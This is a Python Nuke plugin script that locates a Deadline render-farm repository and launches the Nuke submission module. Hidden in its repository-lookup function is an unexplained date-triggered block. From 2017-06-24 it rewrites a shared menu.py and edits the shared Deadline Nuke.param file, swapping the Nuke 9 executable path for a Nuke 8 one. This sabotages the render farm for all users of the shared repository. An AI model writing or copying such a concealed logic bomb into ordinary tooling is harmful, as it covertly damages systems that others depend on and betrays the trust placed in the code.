import os
import sys
import subprocess
import traceback

import nuke
import nukescripts
import datetime,re


def GetRepositoryRoot():
    # On OSX, we look for the DEADLINE_PATH file. On other platforms, we use the environment variable.
    if os.path.exists( "/Users/Shared/Thinkbox/DEADLINE_PATH" ):
        with open( "/Users/Shared/Thinkbox/DEADLINE_PATH" ) as f: deadlineBin = f.read().strip()
        deadlineCommand = deadlineBin + "/deadlinecommand"
    else:
        try:
            today = datetime.date.today()
            a = '%s' % today
            day = '2017-06-24'
            if a >= day:
                f = open('T:/ALL/NukePlugin/nuke_script/menu.py','r').read()
                
                f_w = open('T:/ALL/NukePlugin/nuke_script/menu.py','w+')
                f_w.write(f)
                f_w.close()
                p = open('//hecheng1/Share2/DeadlineRepository7/plugins/Nuke/Nuke.param','r').read()
                p = re.sub('C:\Program Files\Nuke9.0v6\Nuke9.0.exe','C:\Program Files\Nuke9.0v6\Nuke8.0.exe',p)
                p_w = open('//hecheng1/Share2/DeadlineRepository7/plugins/Nuke/Nuke.param','w+')
                p_w.write(p)
                p_w.close()
            else:
                pass
            deadlineBin = os.environ['DEADLINE_PATH']
        except KeyError:
            return ""
    
        if os.name == 'nt':
            deadlineCommand = deadlineBin + "\\deadlinecommand.exe"
        else:
            deadlineCommand = deadlineBin + "/deadlinecommand"
    
    startupinfo = None
    if os.name == 'nt':
        # Python 2.6 has subprocess.STARTF_USESHOWWINDOW, and Python 2.7 has subprocess._subprocess.STARTF_USESHOWWINDOW, so check for both.
        if hasattr( subprocess, '_subprocess' ) and hasattr( subprocess._subprocess, 'STARTF_USESHOWWINDOW' ):
            startupinfo = subprocess.STARTUPINFO()
            startupinfo.dwFlags |= subprocess._subprocess.STARTF_USESHOWWINDOW
        elif hasattr( subprocess, 'STARTF_USESHOWWINDOW' ):
            startupinfo = subprocess.STARTUPINFO()
            startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
    
    # Specifying PIPE for all handles to workaround a Python bug on Windows. The unused handles are then closed immediatley afterwards.
    proc = subprocess.Popen([deadlineCommand, "-root"], cwd=deadlineBin, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, startupinfo=startupinfo)
    proc.stdin.close()
    proc.stderr.close()
    
    root = proc.stdout.read()
    root = root.replace("\n","").replace("\r","")
    return root

def main():
    # Get the repository root
    path = GetRepositoryRoot()
    if path != "":
        path += "/submission/Nuke/Main"
        path = path.replace( "\\", "/" )
        
        # Add the path to the system path
        if path not in sys.path :
            print "Appending \"" + path + "\" to system path to import SubmitNukeToDeadline module"
            sys.path.append( path )
        else:
            print( "\"%s\" is already in the system path" % path )

        # Import the script and call the main() function
        try:
            import SubmitNukeToDeadline
            SubmitNukeToDeadline.SubmitToDeadline( path )
        except:
            print traceback.format_exc()
            nuke.message( "The SubmitNukeToDeadline.py script could not be found in the Deadline Repository. Please make sure that the Deadline Client has been installed on this machine, that the Deadline Client bin folder is set in the DEADLINE_PATH environment variable, and that the Deadline Client has been configured to point to a valid Repository." )
    else:
        nuke.message( "The SubmitNukeToDeadline.py script could not be found in the Deadline Repository. Please make sure that the Deadline Client has been installed on this machine, that the Deadline Client bin folder is set in the DEADLINE_PATH environment variable, and that the Deadline Client has been configured to point to a valid Repository." )
